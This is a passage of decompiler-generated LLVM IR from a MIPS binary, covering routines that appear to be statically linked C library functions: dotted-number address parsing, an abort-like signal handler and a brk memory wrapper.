  uselistorder i32* %t2.global-to-local, { 0, 4, 5, 1, 6, 7, 8, 2, 9, 10, 3 }
  uselistorder i32* %gp.global-to-local, { 1, 0, 2 }
  uselistorder i32* %a3.global-to-local, { 3, 0, 2, 1, 4, 7, 5, 6, 8, 10, 9, 11 }
  uselistorder i32* %a2.global-to-local, { 1, 7, 8, 2, 3, 4, 5, 6, 0 }
  uselistorder i32* %a1.global-to-local, { 1, 3, 8, 9, 6, 2, 11, 13, 12, 4, 5, 10, 14, 7, 0 }
  uselistorder i32* %a0.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 0 }
  uselistorder i32 20, { 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 1, 0, 15, 16, 3, 17, 2, 18, 19, 20 }
  uselistorder i32 -8, { 0, 2, 3, 4, 5, 6, 7, 8, 1, 9, 10 }
  uselistorder i32 16, { 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 1, 5, 29, 0, 30, 31, 32, 33, 2, 34, 36, 35, 37, 6, 38, 7, 39, 8, 40, 9, 41, 42, 43, 3, 44, 4, 10, 45, 46 }
  uselistorder i32 ()* @unknown_0, { 5, 4, 3, 2, 1, 0 }
  uselistorder i32 %arg3, { 2, 0, 1, 3, 5, 4, 6 }
  uselistorder label %dec_label_pc_407b40.dec_label_pc_407b40_crit_edge, { 1, 0 }
  uselistorder label %dec_label_pc_407b38, { 1, 0 }
  uselistorder label %dec_label_pc_407b14, { 1, 0 }
  uselistorder label %dec_label_pc_407a9c, { 1, 0 }
  uselistorder label %dec_label_pc_407a88, { 1, 0 }
  uselistorder label %dec_label_pc_407a70, { 1, 0 }
  uselistorder label %dec_label_pc_407a58, { 1, 0 }
  uselistorder label %dec_label_pc_407a08, { 1, 0 }
  uselistorder label %dec_label_pc_407a00, { 1, 0 }
  uselistorder label %dec_label_pc_4078ac.dec_label_pc_4078ac_crit_edge, { 1, 0 }
  uselistorder label %dec_label_pc_40788c, { 1, 0 }
}

define i32 @function_407b70(i8* %arg1) local_unnamed_addr {
dec_label_pc_407b70:
  %v1_407b7c = icmp eq i8* %arg1, null
  br i1 %v1_407b7c, label %dec_label_pc_407c5c, label %dec_label_pc_407b80

dec_label_pc_407b80:                              ; preds = %dec_label_pc_407b70
  %tmp = ptrtoint i8* %arg1 to i32
  %v3_407b84 = load i32, i32* bitcast (i32*** @global_var_4494b8.403 to i32*), align 4
  br label %dec_label_pc_407b94

dec_label_pc_407b94:                              ; preds = %dec_label_pc_407c28, %dec_label_pc_407b80
  %v0_407c28 = phi i32 [ %v2_407c2c, %dec_label_pc_407c28 ], [ 0, %dec_label_pc_407b80 ]
  %v0_407c30 = phi i32 [ %v1_407c30, %dec_label_pc_407c28 ], [ 1, %dec_label_pc_407b80 ]
  %v0_407b94 = phi i32 [ %v3_407c1416, %dec_label_pc_407c28 ], [ %tmp, %dec_label_pc_407b80 ]
  %v1_407b94 = inttoptr i32 %v0_407b94 to i8*
  %v2_407b94 = load i8, i8* %v1_407b94, align 1
  %v3_407b94 = sext i8 %v2_407b94 to i32
  %v1_407b9c = mul nsw i32 %v3_407b94, 2
  %v2_407ba0 = add i32 %v1_407b9c, %v3_407b84
  %v1_407ba4 = inttoptr i32 %v2_407ba0 to i16*
  %v2_407ba4 = load i16, i16* %v1_407ba4, align 2
  %v1_407bac = and i16 %v2_407ba4, 8
  %v1_407bb0 = icmp eq i16 %v1_407bac, 0
  br i1 %v1_407bb0, label %dec_label_pc_407c5c, label %dec_label_pc_407bc0.preheader

dec_label_pc_407bc0.preheader:                    ; preds = %dec_label_pc_407b94
  %v0_407bc0.pre = load i32, i32* @a3, align 4
  %v3_407bf4 = icmp slt i32 %v0_407c30, 4
  br label %dec_label_pc_407bc0

dec_label_pc_407bc0:                              ; preds = %dec_label_pc_407bc0.preheader, %dec_label_pc_407bcc
  %v2_407bc8 = phi i32 [ %v0_407b94, %dec_label_pc_407bc0.preheader ], [ %v3_407bc8, %dec_label_pc_407bcc ]
  %v0_407bc0 = phi i32 [ %v0_407bc0.pre, %dec_label_pc_407bc0.preheader ], [ %v2_407bec, %dec_label_pc_407bcc ]
  %v1_407bc0 = add i32 %v0_407bc0, -48
  %v1_407bc4 = icmp slt i32 %v1_407bc0, 256
  %v1_407bc8 = icmp eq i1 %v1_407bc4, false
  %v3_407bc8 = add i32 %v2_407bc8, 1
  br i1 %v1_407bc8, label %dec_label_pc_407c5c, label %dec_label_pc_407bcc

dec_label_pc_407bcc:                              ; preds = %dec_label_pc_407bc0
  %v1_407bd0 = inttoptr i32 %v3_407bc8 to i8*
  %v2_407bd0 = load i8, i8* %v1_407bd0, align 1
  %v3_407bd0 = sext i8 %v2_407bd0 to i32
  %v2_407bdc = mul i32 %v1_407bc0, 10
  %v1_407be0 = mul nsw i32 %v3_407bd0, 2
  %v2_407be4 = add i32 %v1_407be0, %v3_407b84
  %v1_407be8 = inttoptr i32 %v2_407be4 to i16*
  %v2_407be8 = load i16, i16* %v1_407be8, align 2
  %v3_407be8 = zext i16 %v2_407be8 to i32
  %v2_407bec = add i32 %v3_407bd0, %v2_407bdc
  store i32 %v2_407bec, i32* @a3, align 4
  %v1_407bf0 = and i32 %v3_407be8, 8
  %v1_407bf4 = icmp eq i32 %v1_407bf0, 0
  br i1 %v1_407bf4, label %dec_label_pc_407bf8, label %dec_label_pc_407bc0

dec_label_pc_407bf8:                              ; preds = %dec_label_pc_407bcc
  %v1_407bfc = icmp eq i1 %v3_407bf4, false
  br i1 %v1_407bfc, label %dec_label_pc_407c14, label %dec_label_pc_407c00

dec_label_pc_407c00:                              ; preds = %dec_label_pc_407bf8
  %v2_407c04 = icmp eq i8 %v2_407bd0, 46
  br i1 %v2_407c04, label %dec_label_pc_407c14.thread, label %dec_label_pc_407c5c

dec_label_pc_407c14.thread:                       ; preds = %dec_label_pc_407c00
  %v3_407c1414 = add i32 %v2_407bc8, 3
  br label %dec_label_pc_407c18

dec_label_pc_407c14:                              ; preds = %dec_label_pc_407bf8
  %v1_407c14 = icmp eq i8 %v2_407bd0, 0
  %v3_407c14 = add i32 %v2_407bc8, 2
  br i1 %v1_407c14, label %dec_label_pc_407c28, label %dec_label_pc_407c18

dec_label_pc_407c18:                              ; preds = %dec_label_pc_407c14.thread, %dec_label_pc_407c14
  %v3_407c1415 = phi i32 [ %v3_407c1414, %dec_label_pc_407c14.thread ], [ %v3_407c14, %dec_label_pc_407c14 ]
  %v1_407c1c = and i32 %v3_407be8, 32
  %v1_407c20 = icmp eq i32 %v1_407c1c, 0
  br i1 %v1_407c20, label %dec_label_pc_407c5c, label %dec_label_pc_407c28

dec_label_pc_407c28:                              ; preds = %dec_label_pc_407c18, %dec_label_pc_407c14
  %v3_407c1416 = phi i32 [ %v3_407c1415, %dec_label_pc_407c18 ], [ %v3_407c14, %dec_label_pc_407c14 ]
  %v1_407c28 = mul i32 %v0_407c28, 256
  %v2_407c2c = or i32 %v1_407bc0, %v1_407c28
  %v1_407c30 = add nuw nsw i32 %v0_407c30, 1
  %v1_407c34 = icmp slt i32 %v1_407c30, 5
  br i1 %v1_407c34, label %dec_label_pc_407b94, label %dec_label_pc_407c3c

dec_label_pc_407c3c:                              ; preds = %dec_label_pc_407c28
  %v0_407c40 = load i32, i32* @a1, align 4
  %v1_407c40 = icmp eq i32 %v0_407c40, 0
  br i1 %v1_407c40, label %dec_label_pc_407c44, label %dec_label_pc_407c50

dec_label_pc_407c44:                              ; preds = %dec_label_pc_407c3c
  ret i32 1

dec_label_pc_407c50:                              ; preds = %dec_label_pc_407c3c
  %v3_407c54 = inttoptr i32 %v0_407c40 to i32*
  store i32 %v2_407c2c, i32* %v3_407c54, align 4
  ret i32 1

dec_label_pc_407c5c:                              ; preds = %dec_label_pc_407c00, %dec_label_pc_407c18, %dec_label_pc_407b94, %dec_label_pc_407bc0, %dec_label_pc_407b70
  ret i32 0

; uselistorder directives
  uselistorder i32 %v1_407c30, { 1, 0 }
  uselistorder i32 %v3_407c14, { 1, 0 }
  uselistorder i32 %v2_407bec, { 1, 0 }
  uselistorder i32 %v3_407bd0, { 1, 0 }
  uselistorder i32 %v3_407bc8, { 1, 0 }
  uselistorder i32 %v0_407c30, { 1, 0 }
  uselistorder i32* @a1, { 13, 14, 12, 3, 15, 16, 11, 9, 17, 18, 2, 19, 20, 4, 1, 0, 10, 21, 22, 23, 24, 5, 25, 6, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 7, 8 }
  uselistorder i32 5, { 5, 6, 2, 7, 8, 0, 9, 10, 11, 12, 13, 14, 1, 15, 3, 16, 17, 4, 18 }
  uselistorder i8 0, { 0, 1, 21, 2, 3, 4, 5, 6, 7, 22, 23, 24, 8, 9, 10, 11, 25, 26, 27, 12, 13, 28, 14, 15, 16, 29, 30, 17, 31, 18, 19, 20 }
  uselistorder i32 8, { 11, 12, 13, 0, 14, 15, 1, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 7, 26, 2, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 3, 39, 40, 5, 4, 41, 42, 43, 44, 45, 46, 47, 48, 49, 50, 51, 52, 53, 54, 8, 55, 9, 56, 10, 6, 57, 58, 59, 60, 61, 62, 63, 64, 65, 66, 67, 68, 69, 70, 71 }
  uselistorder i32 10, { 5, 14, 15, 0, 16, 6, 3, 17, 18, 7, 19, 20, 21, 1, 8, 22, 9, 10, 23, 24, 11, 25, 12, 26, 4, 27, 13, 28, 29, 30, 31, 2, 32, 33 }
  uselistorder i32 256, { 0, 29, 1, 2, 30, 3, 4, 5, 6, 7, 8, 9, 10, 31, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28 }
  uselistorder i32* @a3, { 13, 0, 14, 2, 15, 1, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 3, 27, 28, 29, 30, 31, 32, 33, 34, 35, 10, 11, 7, 36, 37, 4, 38, 39, 40, 41, 42, 43, 9, 44, 45, 46, 47, 12, 48, 49, 50, 51, 52, 53, 54, 55, 56, 6, 57, 58, 59, 60, 61, 62, 63, 64, 65, 66, 67, 68, 69, 70, 8, 5 }
  uselistorder i16 0, { 0, 4, 5, 6, 2, 1, 3 }
  uselistorder i8* %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_407c5c, { 1, 0, 3, 2, 4 }
  uselistorder label %dec_label_pc_407c18, { 1, 0 }
  uselistorder label %dec_label_pc_407bc0, { 1, 0 }
}

define i32 @function_407c70() local_unnamed_addr {
dec_label_pc_407c70:
  %a0.global-to-local = alloca i32, align 4
  %a1.global-to-local = alloca i32, align 4
  %gp.global-to-local = alloca i32, align 4
  %v0.global-to-local = alloca i32, align 4
  %v1.global-to-local = alloca i32, align 4
  %stack_var_-152 = alloca i32, align 4
  %stack_var_-280 = alloca i32, align 4
  %v1_407c78 = load i32, i32* @t9, align 4
  %v2_407c78 = add i32 %v1_407c78, 300384
  store i32 %v2_407c78, i32* %gp.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_4491b0.404 to i32), i32* %a0.global-to-local, align 4
  %v4_407c98 = call i32 @function_406744(i32 ptrtoint (i32* @global_var_4491b0.404 to i32))
  store i32 %v2_407c78, i32* %gp.global-to-local, align 4
  %v2_407ca4 = ptrtoint i32* %stack_var_-280 to i32
  store i32 %v2_407ca4, i32* @s0, align 4
  store i32 32, i32* %v1.global-to-local, align 4
  %v2_407cb024 = add i32 %v4_407c98, %v2_407ca4
  %v1_407cb425 = inttoptr i32 %v2_407cb024 to i32*
  store i32 0, i32* %v1_407cb425, align 4
  %v0_407cb826 = load i32, i32* %v1.global-to-local, align 4
  %v1_407cb827 = add i32 %v0_407cb826, -1
  store i32 %v1_407cb827, i32* %v1.global-to-local, align 4
  %v1_407cbc28 = icmp sgt i32 %v1_407cb827, -1
  %v3_407cbc29 = mul i32 %v1_407cb827, 4
  store i32 %v3_407cbc29, i32* %v0.global-to-local, align 4
  br i1 %v1_407cbc28, label %dec_label_pc_407cb0.dec_label_pc_407cb0_crit_edge, label %dec_label_pc_407cc0

dec_label_pc_407cb0.dec_label_pc_407cb0_crit_edge: ; preds = %dec_label_pc_407c70, %dec_label_pc_407cb0.dec_label_pc_407cb0_crit_edge
  %v3_407cbc30 = phi i32 [ %v3_407cbc, %dec_label_pc_407cb0.dec_label_pc_407cb0_crit_edge ], [ %v3_407cbc29, %dec_label_pc_407c70 ]
  %v1_407cb0.pre = load i32, i32* @s0, align 4
  %v2_407cb0 = add i32 %v3_407cbc30, %v1_407cb0.pre
  %v1_407cb4 = inttoptr i32 %v2_407cb0 to i32*
  store i32 0, i32* %v1_407cb4, align 4
  %v0_407cb8 = load i32, i32* %v1.global-to-local, align 4
  %v1_407cb8 = add i32 %v0_407cb8, -1
  store i32 %v1_407cb8, i32* %v1.global-to-local, align 4
  %v1_407cbc = icmp sgt i32 %v1_407cb8, -1
  %v3_407cbc = mul i32 %v1_407cb8, 4
  store i32 %v3_407cbc, i32* %v0.global-to-local, align 4
  br i1 %v1_407cbc, label %dec_label_pc_407cb0.dec_label_pc_407cb0_crit_edge, label %dec_label_pc_407cc0

dec_label_pc_407cc0:                              ; preds = %dec_label_pc_407cb0.dec_label_pc_407cb0_crit_edge, %dec_label_pc_407c70
  store i32 %v2_407ca4, i32* %a0.global-to-local, align 4
  store i32 6, i32* %a1.global-to-local, align 4
  %v3_407ccc = call i32 @function_405c28(i32 %v2_407ca4, i32 6)
  store i32 %v3_407ccc, i32* %v0.global-to-local, align 4
  store i32 %v2_407c78, i32* %gp.global-to-local, align 4
  %v1_407cd8 = icmp eq i32 %v3_407ccc, 0
  store i32 %v2_407ca4, i32* %a1.global-to-local, align 4
  br i1 %v1_407cd8, label %dec_label_pc_407cdc, label %dec_label_pc_407cf8

dec_label_pc_407cdc:                              ; preds = %dec_label_pc_407cc0
  %v3_407ce0 = load i32, i32* @global_var_4493d0.346, align 4
  store i32 %v3_407ce0, i32* @t9, align 4
  store i32 2, i32* %a0.global-to-local, align 4
  %v4_407ce8 = bitcast i32* %stack_var_-280 to %_TYPEDEF_sigset_t*
  %v5_407ce8 = call i32 @function_4073c0(i32 2, %_TYPEDEF_sigset_t* %v4_407ce8, i32 0)
  store i32 %v5_407ce8, i32* %v0.global-to-local, align 4
  store i32 %v2_407c78, i32* %gp.global-to-local, align 4
  br label %dec_label_pc_407cf8

dec_label_pc_407cf8:                              ; preds = %dec_label_pc_407cc0, %dec_label_pc_407cdc
  %v3_407cf8 = load i32, i32* @global_var_4491e8.9, align 4
  store i32 %v3_407cf8, i32* %v1.global-to-local, align 4
  %v3_407d00 = load i32, i32* @global_var_4495a0.405, align 4
  %v1_407d08 = icmp eq i32 %v3_407d00, 0
  store i32 1, i32* %v0.global-to-local, align 4
  br i1 %v1_407d08, label %dec_label_pc_407d0c, label %dec_label_pc_407d60

dec_label_pc_407d0c:                              ; preds = %dec_label_pc_407cf8
  store i32 1, i32* @global_var_4495a0.405, align 4
  store i32 %v3_407cf8, i32* @s0, align 4
  store i32 ptrtoint (i32* @global_var_4491b0.404 to i32), i32* %a0.global-to-local, align 4
  %v4_407d20 = call i32 @function_406744(i32 ptrtoint (i32* @global_var_4491b0.404 to i32))
  store i32 %v4_407d20, i32* %v0.global-to-local, align 4
  store i32 %v2_407c78, i32* %gp.global-to-local, align 4
  %v3_407d30 = load i32, i32* @global_var_4492a4.406, align 4
  store i32 %v3_407d30, i32* @t9, align 4
  store i32 6, i32* %a0.global-to-local, align 4
  %v2_407d38 = call i32 @function_407ec0(i32 6)
  store i32 %v2_407d38, i32* %v0.global-to-local, align 4
  store i32 %v2_407c78, i32* %gp.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_4491b0.404 to i32), i32* %a0.global-to-local, align 4
  %v4_407d50 = call i32 @function_406744(i32 ptrtoint (i32* @global_var_4491b0.404 to i32))
  store i32 %v4_407d50, i32* %v0.global-to-local, align 4
  store i32 %v2_407c78, i32* %gp.global-to-local, align 4
  br label %dec_label_pc_407d60

dec_label_pc_407d60:                              ; preds = %dec_label_pc_407cf8, %dec_label_pc_407d0c
  %v1_407d60 = add i32 %v1_407c78, 267640
  %v2_407d60 = inttoptr i32 %v1_407d60 to i32*
  %v3_407d60 = load i32, i32* %v2_407d60, align 4
  store i32 %v3_407d60, i32* @a0, align 4
  store i32 1, i32* %v0.global-to-local, align 4
  %v1_407d68 = add i32 %v3_407d60, -27232
  %v2_407d68 = inttoptr i32 %v1_407d68 to i32*
  %v3_407d68 = load i32, i32* %v2_407d68, align 4
  store i32 %v3_407d68, i32* %v1.global-to-local, align 4
  %v2_407d70 = icmp eq i32 %v3_407d68, 1
  store i32 2, i32* %v0.global-to-local, align 4
  br i1 %v2_407d70, label %dec_label_pc_407d74, label %dec_label_pc_407de0

dec_label_pc_407d74:                              ; preds = %dec_label_pc_407d60
  %v1_407d78 = add i32 %v1_407c78, 267668
  %v2_407d78 = inttoptr i32 %v1_407d78 to i32*
  %v3_407d78 = load i32, i32* %v2_407d78, align 4
  store i32 2, i32* %v2_407d68, align 4
  store i32 0, i32* %a1.global-to-local, align 4
  %v2_407d84 = ptrtoint i32* %stack_var_-152 to i32
  store i32 %v2_407d84, i32* %a0.global-to-local, align 4
  call void @__pseudo_call(i32 %v3_407d78)
  store i32 %v2_407c78, i32* %gp.global-to-local, align 4
  store i32 32, i32* %v1.global-to-local, align 4
  store i32 %v2_407ca4, i32* %a1.global-to-local, align 4
  store i32 -1, i32* %a0.global-to-local, align 4
  %v0_407da8.pre = load i32, i32* %v0.global-to-local, align 4
  %v2_407da816 = add i32 %v2_407ca4, 136
  %v2_407dac17 = add i32 %v2_407da816, %v0_407da8.pre
  %v3_407dac18 = inttoptr i32 %v2_407dac17 to i32*
  store i32 -1, i32* %v3_407dac18, align 4
  %v0_407db019 = load i32, i32* %v1.global-to-local, align 4
  %v1_407db020 = add i32 %v0_407db019, -1
  store i32 %v1_407db020, i32* @v1, align 4
  %v1_407db421 = icmp sgt i32 %v1_407db020, -1
  %v3_407db422 = mul i32 %v1_407db020, 4
  store i32 %v3_407db422, i32* @v0, align 4
  br i1 %v1_407db421, label %dec_label_pc_407da8.dec_label_pc_407da8_crit_edge, label %dec_label_pc_407db8

dec_label_pc_407da8.dec_label_pc_407da8_crit_edge: ; preds = %dec_label_pc_407d74, %dec_label_pc_407da8.dec_label_pc_407da8_crit_edge
  %v3_407db423 = phi i32 [ %v3_407db4, %dec_label_pc_407da8.dec_label_pc_407da8_crit_edge ], [ %v3_407db422, %dec_label_pc_407d74 ]
  %v1_407da8.pre = load i32, i32* %a1.global-to-local, align 4
  %v0_407dac.pre = load i32, i32* %a0.global-to-local, align 4
  %v2_407da8 = add i32 %v1_407da8.pre, 136
  %v2_407dac = add i32 %v2_407da8, %v3_407db423
  %v3_407dac = inttoptr i32 %v2_407dac to i32*
  store i32 %v0_407dac.pre, i32* %v3_407dac, align 4
  %v0_407db0 = load i32, i32* @v1, align 4
  %v1_407db0 = add i32 %v0_407db0, -1
  store i32 %v1_407db0, i32* @v1, align 4
  %v1_407db4 = icmp sgt i32 %v1_407db0, -1
  %v3_407db4 = mul i32 %v1_407db0, 4
  store i32 %v3_407db4, i32* @v0, align 4
  br i1 %v1_407db4, label %dec_label_pc_407da8.dec_label_pc_407da8_crit_edge, label %dec_label_pc_407db8

dec_label_pc_407db8:                              ; preds = %dec_label_pc_407da8.dec_label_pc_407da8_crit_edge, %dec_label_pc_407d74
  %v3_407dbc = load i32, i32* @global_var_4494b4.317, align 4
  store i32 %v3_407dbc, i32* @t9, align 4
  store i32 0, i32* %stack_var_-152, align 4
  store i32 6, i32* %a0.global-to-local, align 4
  store i32 %v2_407d84, i32* %a1.global-to-local, align 4
  %v5_407dcc = call i32 @function_406bd0(i32 6, i32* nonnull %stack_var_-152, i32 0)
  store i32 %v5_407dcc, i32* %v0.global-to-local, align 4
  store i32 %v2_407c78, i32* %gp.global-to-local, align 4
  %v0_407de0.pre = load i32, i32* @v1, align 4
  br label %dec_label_pc_407de0

dec_label_pc_407de0:                              ; preds = %dec_label_pc_407d60, %dec_label_pc_407db8
  %v1_407de0 = phi i32 [ 2, %dec_label_pc_407d60 ], [ %v5_407dcc, %dec_label_pc_407db8 ]
  %v0_407de0 = phi i32 [ %v3_407d68, %dec_label_pc_407d60 ], [ %v0_407de0.pre, %dec_label_pc_407db8 ]
  %v2_407de0 = icmp eq i32 %v0_407de0, %v1_407de0
  store i32 3, i32* %v0.global-to-local, align 4
  br i1 %v2_407de0, label %dec_label_pc_407de4, label %dec_label_pc_407df0

dec_label_pc_407de4:                              ; preds = %dec_label_pc_407de0
  %v1_407de8 = load i32, i32* @a0, align 4
  %v2_407de8 = add i32 %v1_407de8, -27232
  %v3_407de8 = inttoptr i32 %v2_407de8 to i32*
  store i32 3, i32* %v3_407de8, align 4
  br label %dec_label_pc_407df0

dec_label_pc_407df0:                              ; preds = %dec_label_pc_407de0, %dec_label_pc_407de4
  %v0_407df0 = load i32, i32* @a0, align 4
  %v1_407df0 = add i32 %v0_407df0, -27232
  %v2_407df0 = inttoptr i32 %v1_407df0 to i32*
  %v3_407df0 = load i32, i32* %v2_407df0, align 4
  store i32 %v3_407df0, i32* %v1.global-to-local, align 4
  %v2_407df8 = icmp eq i32 %v3_407df0, 3
  store i32 4, i32* %v0.global-to-local, align 4
  br i1 %v2_407df8, label %dec_label_pc_407dfc, label %dec_label_pc_407e10

dec_label_pc_407dfc:                              ; preds = %dec_label_pc_407df0
  %v0_407e00 = load i32, i32* %gp.global-to-local, align 4
  %v1_407e00 = add i32 %v0_407e00, -32416
  %v2_407e00 = inttoptr i32 %v1_407e00 to i32*
  %v3_407e00 = load i32, i32* %v2_407e00, align 4
  store i32 4, i32* %v2_407df0, align 4
  store i32 127, i32* %a0.global-to-local, align 4
  call void @__pseudo_call(i32 %v3_407e00)
  br label %dec_label_pc_407e10

dec_label_pc_407e10:                              ; preds = %dec_label_pc_407df0, %dec_label_pc_407dfc
  ret i32 4

; uselistorder directives
  uselistorder i32 %v3_407db422, { 1, 0 }
  uselistorder i32 %v3_407cbc29, { 1, 0 }
  uselistorder i32 %v2_407ca4, { 1, 2, 3, 5, 4, 0, 6 }
  uselistorder i32* %v1.global-to-local, { 0, 1, 2, 3, 4, 5, 8, 9, 6, 7 }
  uselistorder i32* %v0.global-to-local, { 0, 1, 5, 3, 4, 2, 6, 7, 9, 8, 10, 12, 11, 13 }
  uselistorder i32* %gp.global-to-local, { 6, 0, 1, 2, 3, 4, 5, 7, 8, 9 }
  uselistorder i32* %a0.global-to-local, { 0, 1, 2, 3, 4, 5, 7, 6, 8, 9, 10 }
  uselistorder i32 127, { 1, 0, 2 }
  uselistorder i32 3, { 4, 3, 8, 0, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 5, 19, 20, 6, 21, 22, 23, 24, 25, 7, 26, 27, 28, 29, 2, 30, 1 }
  uselistorder i32* @v1, { 1, 5, 6, 0, 7, 8, 9, 2, 10, 11, 12, 3, 4, 13, 14, 15, 16 }
  uselistorder i32 136, { 1, 0, 2, 3 }
  uselistorder i32* @a0, { 15, 16, 17, 18, 19, 20, 21, 13, 22, 4, 2, 23, 24, 25, 5, 26, 27, 6, 0, 1, 28, 12, 29, 30, 14, 7, 3, 8, 31, 32, 9, 10, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 11 }
  uselistorder i32 2, { 7, 8, 30, 17, 31, 4, 0, 1, 32, 33, 34, 35, 18, 19, 2, 5, 6, 36, 3, 9, 10, 37, 38, 39, 11, 40, 16, 41, 13, 42, 20, 43, 44, 45, 21, 46, 22, 47, 23, 48, 14, 49, 24, 25, 50, 26, 27, 51, 52, 53, 12, 28, 54, 29, 55, 15, 56, 57, 58, 59, 60, 61, 62, 63, 64, 65, 66, 67 }
  uselistorder i32 (i32, i32)* @function_405c28, { 1, 0 }
  uselistorder i32 6, { 1, 8, 2, 9, 3, 10, 11, 12, 13, 14, 15, 16, 4, 17, 5, 18, 6, 0, 19, 7, 20, 21 }
  uselistorder i32 4, { 0, 49, 55, 1, 2, 3, 4, 56, 5, 57, 58, 59, 6, 60, 61, 62, 7, 8, 9, 10, 63, 64, 40, 41, 11, 12, 65, 66, 42, 43, 13, 67, 14, 15, 68, 69, 70, 71, 72, 73, 16, 17, 18, 74, 75, 44, 19, 20, 21, 22, 76, 77, 78, 79, 80, 81, 82, 83, 84, 85, 86, 87, 88, 89, 23, 24, 25, 26, 90, 91, 27, 92, 93, 94, 95, 96, 97, 28, 29, 98, 99, 30, 100, 46, 101, 31, 32, 33, 102, 103, 104, 105, 50, 106, 107, 108, 34, 109, 110, 111, 52, 45, 112, 113, 35, 114, 36, 115, 116, 48, 37, 38, 117, 118, 119, 47, 120, 39, 121, 53, 122, 123, 124, 125, 126, 127, 128, 54, 129, 51, 130, 131, 132, 133, 134, 135, 136, 137, 138, 139, 140, 141, 142, 143, 144, 145, 146, 147, 148, 149, 150, 151, 152, 153, 154, 155, 156, 157 }
  uselistorder i32 32, { 20, 21, 22, 17, 23, 24, 0, 25, 26, 27, 28, 29, 30, 1, 2, 3, 31, 16, 32, 4, 5, 6, 7, 9, 8, 11, 10, 12, 13, 14, 15, 18, 33, 34, 35, 19, 36 }
  uselistorder i32 (i32)* @function_406744, { 16, 15, 14, 0, 13, 12, 11, 10, 9, 8, 7, 6, 5, 4, 3, 2, 1 }
  uselistorder i32 ptrtoint (i32* @global_var_4491b0.404 to i32), { 0, 3, 1, 4, 2, 5 }
  uselistorder label %dec_label_pc_407e10, { 1, 0 }
  uselistorder label %dec_label_pc_407df0, { 1, 0 }
  uselistorder label %dec_label_pc_407de0, { 1, 0 }
  uselistorder label %dec_label_pc_407da8.dec_label_pc_407da8_crit_edge, { 1, 0 }
  uselistorder label %dec_label_pc_407d60, { 1, 0 }
  uselistorder label %dec_label_pc_407cf8, { 1, 0 }
  uselistorder label %dec_label_pc_407cb0.dec_label_pc_407cb0_crit_edge, { 1, 0 }
}

define i32 @function_407e20(i32 %arg1) local_unnamed_addr {
dec_label_pc_407e20:
  %v1_407e2c = add i32 %arg1, 28
  %v2_407e2c = inttoptr i32 %v1_407e2c to i32*
  %v3_407e2c = load i32, i32* %v2_407e2c, align 4
  %v3_407e30 = load i32, i32* bitcast (i32** @global_var_44937c.410 to i32*), align 4
  %v2_407e38 = inttoptr i32 %v3_407e30 to i32*
  store i32 %v3_407e2c, i32* %v2_407e38, align 4
  %v1_407e3c = add i32 %arg1, 44
  %v2_407e3c = inttoptr i32 %v1_407e3c to i32*
  %v3_407e3c = load i32, i32* %v2_407e3c, align 4
  %v3_407e40 = load i32, i32* @global_var_4492e4, align 4
  %v3_407e44 = inttoptr i32 %v3_407e40 to i32*
  store i32 %v3_407e3c, i32* %v3_407e44, align 4
  ret i32 %v3_407e40

; uselistorder directives
  uselistorder i32 28, { 5, 6, 7, 8, 9, 10, 11, 12, 0, 1, 2, 3, 4, 13 }
}

define i32 @function_407e50(i32* %arg1) local_unnamed_addr {
dec_label_pc_407e50:
  %a0.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i32* %arg1 to i32
  store i32 %tmp, i32* %a0.global-to-local, align 4
  %v3_407e68 = load i32, i32* @global_var_4492e0.256, align 4
  store i32 %v3_407e68, i32* @a2, align 4
  store i32 %tmp, i32* %a0.global-to-local, align 4
  %v2_407e7c = call i32 @brk(i32* %arg1)
  %v3_407e80 = load i32, i32* bitcast (i32** @global_var_4492e8.34 to i32*), align 4
  %v2_407e84 = icmp ult i32 %v2_407e7c, %tmp
  store i32 0, i32* %a0.global-to-local, align 4
  %v1_407e8c = icmp eq i1 %v2_407e84, false
  %v4_407e8c = inttoptr i32 %v3_407e80 to i32*
  store i32 %v2_407e7c, i32* %v4_407e8c, align 4
  br i1 %v1_407e8c, label %dec_label_pc_407eb0, label %dec_label_pc_407e90

dec_label_pc_407e90:                              ; preds = %dec_label_pc_407e50
  %v0_407e94 = load i32, i32* @a2, align 4
  store i32 %v0_407e94, i32* @t9, align 4
  %v1_407e98 = call i32 @function_405490()
  store i32 -1, i32* %a0.global-to-local, align 4
  %v2_407eac = inttoptr i32 %v1_407e98 to i32*
  store i32 12, i32* %v2_407eac, align 4
  br label %dec_label_pc_407eb0

dec_label_pc_407eb0:                              ; preds = %dec_label_pc_407e50, %dec_label_pc_407e90
  %v0_407eb4 = load i32, i32* %a0.global-to-local, align 4
  ret i32 %v0_407eb4

; uselistorder directives
  uselistorder i32* %a0.global-to-local, { 2, 1, 3, 4, 0 }
  uselistorder i32 12, { 4, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 2, 24, 25, 0, 26, 5, 27, 6, 28, 29, 7, 30, 31, 32, 33, 1, 8, 34, 9, 35, 3, 36, 37, 38, 39, 40, 41, 10, 11 }
  uselistorder i32 ()* @function_405490, { 51, 50, 49, 48, 47, 46, 45, 44, 43, 42, 41, 40, 39, 38, 37, 36, 35, 34, 33, 32, 31, 30, 29, 28, 27, 26, 25, 24, 23, 22, 21, 20, 19, 18, 17, 16, 15, 14, 13, 12, 11, 10, 9, 8, 7, 6, 5, 4, 3, 2, 1, 0 }
  uselistorder i1 false, { 16, 10, 17, 0, 1, 18, 11, 19, 20, 2, 12, 21, 3, 22, 23, 4, 5, 24, 13, 25, 26, 27, 6, 28, 29, 30, 31, 14, 32, 33, 34, 35, 36, 7, 37, 8, 38, 9, 39, 15, 40, 41 }
